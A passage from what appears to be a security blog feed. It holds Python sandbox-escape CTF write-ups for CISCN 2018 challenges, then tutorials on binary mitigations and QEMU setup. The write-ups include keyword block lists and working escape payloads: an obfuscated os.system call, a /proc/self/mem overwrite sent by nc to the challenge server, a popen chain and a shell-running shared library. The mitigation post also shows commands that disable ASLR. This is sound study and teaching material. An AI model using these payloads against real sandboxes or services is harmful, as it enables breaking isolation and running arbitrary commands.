class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_filter</span>(<span class="params">command</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sandbox_exec</span>(<span class="params">command</span>):</span>      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="CISCN-2018-RUN"><a href="#CISCN-2018-RUN" class="headerlink" title="CISCN 2018 - RUN"></a>CISCN 2018 - RUN</h2><p>This one belongs to pwn.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-09 23:30:58</span></span><br><span class="line"><span class="comment"># @Author  : Xu (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://xuccc.github.io/</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line"><span class="keyword">from</span> cpython <span class="keyword">import</span> get_dict</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> FunctionType</span><br><span class="line"></span><br><span class="line">main  = modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__</span><br><span class="line">origin_builtins = main[<span class="string">&#x27;__builtins__&#x27;</span>].__dict__</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span>():</span></span><br><span class="line">    type_dict = get_dict(<span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">&#x27;__bases__&#x27;</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">&#x27;__subclasses__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span>():</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">&#x27;func_code&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_import</span>(<span class="params"><span class="built_in">__import__</span>,whiteList</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">importer</span>(<span class="params">name,<span class="built_in">globals</span>=&#123;&#125;,<span class="built_in">locals</span>=&#123;&#125;,fromlist=[],level=-<span class="number">1</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">__import__</span>(name,<span class="built_in">globals</span>,<span class="built_in">locals</span>,fromlist,level)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;HAHA,[%s]  has been banned~&quot;</span> % name</span><br><span class="line">    <span class="keyword">return</span> importer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadOnly</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;docstring for ReadOnlu&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span>(<span class="params">self,keys</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self,key,default=<span class="literal">None</span></span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">popitem</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setdefault</span>(<span class="params">self,key,value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span>(<span class="params">self,key,value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self,<span class="built_in">dict</span>,**kwargs</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;:(&quot;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span>():</span></span><br><span class="line">    whiteList = <span class="string">&quot;raw_input  SyntaxError   ValueError  NameError  Exception __import__&quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">not</span> <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span>(<span class="params">string</span>):</span></span><br><span class="line">    ban = <span class="string">&quot;exec eval pickle os subprocess input sys ls cat&quot;</span>.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ban:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.lower():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;&#123;&#125; has been banned!&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_type();</span></span><br><span class="line"><span class="keyword">del</span> delete_type</span><br><span class="line">delete_func_code();<span class="keyword">del</span> delete_func_code</span><br><span class="line">builtins_clear();<span class="keyword">del</span> builtins_clear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whiteMod = []</span><br><span class="line">origin_builtins[<span class="string">&#x27;__import__&#x27;</span>] = safe_import(<span class="built_in">__import__</span>,whiteMod)</span><br><span class="line">safe_builtins = ReadOnly(origin_builtins);<span class="keyword">del</span> ReadOnly</span><br><span class="line">main[<span class="string">&#x27;__builtins__&#x27;</span>] = safe_builtins;<span class="keyword">del</span> safe_builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType</span><br><span class="line"><span class="keyword">del</span> __builtins__, __doc__, __file__, __name__, __package__</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ____                  </span></span><br><span class="line"><span class="string"> |  _ \ _   _ _ __      </span></span><br><span class="line"><span class="string"> | |_) | | | | &#x27;_ \     </span></span><br><span class="line"><span class="string"> |  _ &lt;| |_| | | | |    </span></span><br><span class="line"><span class="string"> |_| \_\\__,_|_| |_|    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Escape from the dark house built with python :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Try to getshell then find the flag!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp = raw_input(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    cmd = input_filter(inp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> cmd </span><br><span class="line">    <span class="keyword">except</span> NameError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;wow something lose!We can\&#x27;t find it !  D:&quot;</span></span><br><span class="line">    <span class="keyword">except</span> SyntaxError,e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Noob! Synax Wrong! :(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;unknow error,try again  :&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>pwn writeup</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># look up the addresses</span></span><br><span class="line">objdump -R python.out | grep -E <span class="string">&#x27;fopen|system&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># copy 8 bytes from the system address to the fopen64 address, and get flag</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&#x27;grep ciscn -r /home/ctf/&#x27;)) (().__class__.__bases__[0].__subclasses__()[40](&#x27;/proc/self/mem&#x27;,&#x27;r&#x27;), ().__class__.__bases__[0].__subclasses__()[40](&#x27;/proc/self/mem&#x27;,&#x27;w&#x27;,0))&quot;</span> | nc 117.78.43.163 31836</span><br></pre></td></tr></table></figure>
<p>web writeup</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">d = <span class="string">&quot;sy&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">b = <span class="string">&quot;o&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line">c = <span class="string">&quot;l&quot;</span>+<span class="string">&quot;s&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[d].modules[b].popen(c).<span class="built_in">read</span>())</span><br></pre></td></tr></table></figure>

<p>Or you can prepare a <code>so</code> lib file</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>Then load this using module <code>ctypes</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">86</span>](().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">85</span>]).LoadLibrary(<span class="string">&#x27;/tmp/bk.so&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>sandbox-escape</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Security Protection Mechanism</title>
    <url>/2020/01/23/2020-01-23-Security-Protection-Mechanism/</url>
    <content><![CDATA[<p>Binary vulnerabilities are executable files (PE, ELF files, etc.) that are not properly considered when encoding, causing softwares to perform unexpected functions.<br>Binary vulnerabilities include: </p>
<ul>
<li>buffer(stack, bss or heap) overflow</li>
<li>integer overflow</li>
<li>format string vulnerability</li>
<li>use after free</li>
<li>race condition</li>
<li>sandbox escape</li>
<li>IO flie related</li>
<li>…</li>
</ul>
<p>Security Protection Mechanism is needed for software security.</p>
<h2 id="Linux-Security-Protection-Mechanism"><a href="#Linux-Security-Protection-Mechanism" class="headerlink" title="Linux Security Protection Mechanism"></a>Linux Security Protection Mechanism</h2><p>To pwn, the initial step to check file’s format is:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file xxxxx</span><br><span class="line">xxxxx: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=294d1f19a085a730da19a6c55788ec08c2187039, stripped</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">xxxxx: PE32+ executable (GUI) x86-64, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure>
<p>The next and important step is:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$  checksec xxxxx</span><br><span class="line">[*] <span class="string">&#x27;/root/xxxxx&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">$  gdb xxxxx</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Now the question is, what are those above means?</p>
<h3 id="Canary-GS"><a href="#Canary-GS" class="headerlink" title="Canary (GS)"></a>Canary (GS)</h3><p>Attacks caused by stack overflows are very common and very old. A mitigation technique called canary has long appeared in glibc and has been the first line of defense for system security.</p>
<p>Canary is simple and efficient in both implementation and design. It is to insert a value. At the end of the high-risk area where stack overflow occurs, when the function returns, check if the value of canary has been changed to determine whether stack&#x2F;buffer overflow is occur.</p>
<p>Canary and GS protection under Windows are effective means to prevent stack overflow. Its appearance largely prevents stack overflow, and since it hardly consumes system resources, it has become the standard of protection mechanism under Linux. </p>
<p>Canary can be set in GCC using the following parameters:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-fstack-protector (default)</span><br><span class="line"><span class="comment"># enables protection, but inserts protection only for functions that contain arrays in local variables</span></span><br><span class="line"></span><br><span class="line">-fstack-protector-all </span><br><span class="line"><span class="comment"># enable protection, insert protection for all functions</span></span><br><span class="line"></span><br><span class="line">-fstack-protector-strong</span><br><span class="line"></span><br><span class="line">-fstack-protector-explicit </span><br><span class="line"><span class="comment"># enables protection only for functions with explicit stack_protect attribute</span></span><br><span class="line"></span><br><span class="line">-fno-stack-protector </span><br><span class="line"><span class="comment"># Disable protection.</span></span><br></pre></td></tr></table></figure>
<h3 id="Fortify"><a href="#Fortify" class="headerlink" title="Fortify"></a>Fortify</h3><p>This has something to do with a macro: <code>_FORTIFY_SOURCE</code></p>
<p>Defining this macro causes some lightweight checks to be performed to detect some buffer overflow errors when employing various string and memory manipulation functions (for example, memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets, and wide character variants thereof). </p>
<p>For some functions, argument consistency is checked; for example, a check is made that open has been supplied with a mode argument when the specified flags include <code>O_CREAT</code>. For <code>printf</code> the <code>%n</code> is forbidden and <code>%num$s</code> can only exist when <code>%num-1$s</code>, <code>%num-2$s</code>, … <code>%2$s</code> and <code>%1$s</code>(<code>%s</code>) all exist.  Not all problems are detected, just some common cases.</p>
<p>Some of the checks can be performed at compile time (via macros logic implemented in header files), and result in compiler warnings; other checks take place at run time, and result in a run-time error if the check fails.</p>
<p>Use of this macro requires compiler support, available with gcc since version 4.0.</p>
<p>Fortify can be set in GCC using the following parameters:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-U_FORTIFY_SOURCE </span><br><span class="line"><span class="comment"># Disable protection (default)</span></span><br><span class="line"></span><br><span class="line">-D_FORTIFY_SOURCE=1</span><br><span class="line"><span class="comment"># level 1</span></span><br><span class="line"><span class="comment"># If _FORTIFY_SOURCE is set to 1, with compiler optimization level 1 (gcc -O1) and above, checks that shouldn&#x27;t change the behavior of conforming programs are performed.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># As for &#x27;compiler optimization&#x27;, it&#x27;s for producing better machine codes.</span></span><br><span class="line"><span class="comment"># to be brief, this level only protect codes without optimization.</span></span><br><span class="line"></span><br><span class="line">-D_FORTIFY_SOURCE=2</span><br><span class="line"><span class="comment"># level 2</span></span><br><span class="line"><span class="comment"># With _FORTIFY_SOURCE set to 2, some more checking is added, but some conforming programs might fail.</span></span><br><span class="line"><span class="comment"># This level protects codes anyway.</span></span><br></pre></td></tr></table></figure>

<h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX (DEP)"></a>NX (DEP)</h3><p>The basic principle of NX (No-eXecute) is to identify the memory page where the data is located as non-executable.</p>
<p>When the program overflows and transfers to shellcode successfully, the program will try to execute instructions on the data page, and the CPU will throw an exception instead of executing malicious instructions. </p>
<p>The principle is the same as DEP under windows.</p>
<p>NX can be set in GCC using the following parameters:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-z execstack </span><br><span class="line"><span class="comment"># Disable protection</span></span><br><span class="line"></span><br><span class="line">-z noexecstack </span><br><span class="line"><span class="comment"># Enable protection (default)</span></span><br></pre></td></tr></table></figure>

<h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE (ASLR)"></a>PIE (ASLR)</h3><p>In general, NX (called DEP on Windows platforms) and Address Space Distribution Randomization (ASLR) will work simultaneously.</p>
<p>Memory address randomization mechanism (address space layout randomization) has three levels</p>
<ul>
<li>0: off ASLR. no randomization, same base address for stack &amp; heap, and same address for libc.so</li>
<li>1: normal ASLR. random base address for mmap, stack and libc.so , but not randomize for heap</li>
<li>2: advanced&#x2F;enhanced ASLR, random heap address added</li>
</ul>
<p>Check ASLR condition</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sysctl -n kernel.randomize_va_space</span><br><span class="line">1</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>Off ASLR (same way as changing level)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sysctl -w kernel.randomize_va_space=0</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>As for PIE : Position-Independent-Executable<br>It’s the name for ASLR on Linux.</p>
<p>Difference:</p>
<ul>
<li>PIE (on executable) is a power giver. It enables program to randomize address or not.</li>
<li>ASLR (on process) is the power user. It tells operating system to do program address randomization.</li>
</ul>
<p>PIE can be set in GCC using the following parameters:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-no-pie <span class="comment"># Disable PIE (default)</span></span><br><span class="line">-fpie -pie <span class="comment"># Enable PIE, level 1</span></span><br><span class="line">-fPIE -pie <span class="comment"># Enable PIE, level 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;-fpie&#x27; and &#x27;-fPIE&#x27; used for compilation, and &#x27;-pie&#x27; used for linking</span></span><br><span class="line"><span class="comment"># &#x27;-pie&#x27; is necessary for &#x27;-fpie&#x27; and &#x27;-fPIE&#x27;</span></span><br><span class="line"></span><br><span class="line">-fpic <span class="comment"># Enable PIC, level 1, but disable PIE</span></span><br><span class="line">-fPIC <span class="comment"># Enable PIC, level 2, but disable PIE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;-fpic&#x27;        </span></span><br><span class="line"><span class="comment"># If the GOT size for the linked executable exceeds a machine-specific maximum size, you get an error message from the linker indicating that -fpic does not work; in that case, recompile with -fPIC instead. (These maximums are 8k on the SPARC and 32k on the m68k and RS/6000. The 386 has no such limit.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;-fPIC&#x27;</span></span><br><span class="line"><span class="comment"># If supported for the target machine, emit position-independent code, suitable for dynamic linking and avoiding any limit on the size of the global offset table. This option makes a difference on the m68k, PowerPC and SPARC. Position-independent code requires special support, and therefore works only on certain machines.</span></span><br></pre></td></tr></table></figure>

<p>As for PIC : Position-Independent Code<br>The difference between PIE and PIC:<br>PIE parameter is for executable files<br>PIC parameter is for shared library</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>In the area of Linux system security, the data storage area that can be written will be the target of the attack, especially the area where function pointers are stored. So from the perspective of security protection, minimizing the writable storage area will be of great benefit to security.</p>
<p>GCC, GNU linker, and Glibc-dynamic linker work together to implement a technology called RELRO: read only relocation. The approximate implementation is setting the area of the binary specified by the linker after the dynamic linker has processed the relocation as read-only.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-z norelro <span class="comment"># No RELRO</span></span><br><span class="line">-z lazy <span class="comment"># Partial RELRO (default)</span></span><br><span class="line">-z now <span class="comment"># Full RELRO</span></span><br></pre></td></tr></table></figure>

<h3 id="Sum-Up"><a href="#Sum-Up" class="headerlink" title="Sum-Up"></a>Sum-Up</h3><p>NX：-z execstack &#x2F; -z noexecstack (Off &#x2F; On)<br>Canary：-fno-stack-protector &#x2F;-fstack-protector &#x2F; -fstack-protector-all (Off &#x2F; On &#x2F; All Func On)<br>PIE：-no-pie &#x2F; -pie (Off &#x2F; On)<br>RELRO：-z norelro &#x2F; -z lazy &#x2F; -z now (Off &#x2F; Partial &#x2F; Full)</p>
<h2 id="Windows-Security-Protection-Mechanism"><a href="#Windows-Security-Protection-Mechanism" class="headerlink" title="Windows Security Protection Mechanism"></a>Windows Security Protection Mechanism</h2><p>There’re always many compiling options in Visual Studio when coding.<br>They can be set in Visual Studio before compilation.<br>Some parameters explained as below.</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>Similar to Canary.<br>After the GS option is enabled, a piece of data is saved on the stack at the beginning of the function execution, and the data is checked when the function returns. If it is inconsistent, it is overwritten, so it jumps into the corresponding processing process and no longer returns, so the shellcode cannot be executed, this value is called “Security cookie”. Software calls Check_Security_Cookie () to check whether the stack is covered.</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>Canary is useful for stack overflow.<br>However, they ignored that the SEH chain of exception handling is also on the stack, so they can overwrite the address of the SEH chain as jmp esp, and then trigger an exception to jump to the esp to execute the shellcode.</p>
<p>SafeSEH registers all exception handling functions when the program is compiled to a registered list. After an exception is triggered during execution, a check function is performed to check whether the address pointed to by the SEH chain is in the registered list.</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Similar to NX.<br>However, in the logic of the check function, the execution is prevented only when the SEH chain points&#x2F;links to the module (exe, dll) address. If the address pointed&#x2F;linked to by the SEH chain is not in these modules, then it can be executed. Therefore, the program is not a module Find the jmp esp in the data space, such as the resource file with the nls suffix, etc., or in software that supports JS scripts (browser, etc.) bypass by writing shellcode through the script to allocated heap.</p>
<p>Data execution protection (DEP) refers to the heap and stack with only read and write permissions and no execute permissions. Therefore no shellcodes can be executed.</p>
<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>Similar to PIE.<br>Load code to random space to prevent ROP.</p>
<h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h3><p>CFI stands for Control-Flow Integrity.<br>It mainly adds dynamic security to the binary executable file by dynamically rewriting it.</p>
<p>e.g.<br>Insert a check ID agreed in the rewrite before the destination address of jmp, and check if the data in front of the destination address is the agreed check ID in jmp. If not, enter the error processing flow.<br><img src="/imghost/spm/1.png" alt="example1"><br>Insert the check ID before the destination address of the call and the return address of ret, and then the check of the check ID is added to the rewritten call and ret. If it does not meet the expectations, enter the error processing flow.<br><img src="/imghost/spm/2.png" alt="example2"></p>
<p>The implementation of CFI requires that when jmp, or call to a register (or use register indirect addressing), the destination address must sometimes be obtained dynamically, and the overhead of rewriting is very large, which has caused certain difficulties in the practical application of CFI.</p>
<p>CFG is the abbreviation of Control Flow Guard, which is a control flow protection. It is a combination of compiler and operating system protection, the purpose is to prevent untrusted indirect calls.</p>
<p>In the course of the vulnerability attack, a common exploitation method is to overwrite or directly tamper with the value of a register, tamper with the address of the indirect call, and then control the program execution flow. CFG records all indirect call information during compilation and linking, and records them in the final executable file, and inserts additional checks before all indirect calls. When the address of the indirect call is tampered, An exception is triggered and the operating system intervenes.</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>QEMU Intro and Network Configuration</title>
    <url>/2020/01/11/2020-01-11-QEMU-Intro-and-Network-Configuration/</url>
    <content><![CDATA[<p>To analyse firmwares or apps from different architectures on your Linux PC, you have to use emulator to run them.<br>Here I introduce QEMU to you.</p>
<h2 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h2><p>QEMU is a generic and open source machine emulator and virtualizer.<br>QEMU has two operating modes:</p>
<ul>
<li><p>Full system emulation<br>In this mode, QEMU emulates a full system (for example a PC), including a processor and various peripherals. It can be used to launch different Operating Systems without rebooting the PC or to debug system code.</p>
</li>
<li><p>User mode emulation (Linux host only)<br>In this mode, QEMU can launch Linux processes compiled for one CPU on another CPU. For example, it can be used to launch Wine or to ease cross-compilation and cross-debugging.</p>
</li>
</ul>
<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>Full system emulation: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install qemu-system <span class="comment"># install many qemu&#x27;s platform emulators </span></span><br></pre></td></tr></table></figure>
<p>User mode emulation:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install qemu-user <span class="comment"># to run apps with dynamic linked libs</span></span><br><span class="line">$ apt install qemu-user-binfmt <span class="comment"># installed along with qemu-user</span></span><br><span class="line">$ apt install binfmt-support</span><br><span class="line">$ apt install qemu-user-static <span class="comment"># to run apps with static linked libs</span></span><br></pre></td></tr></table></figure>
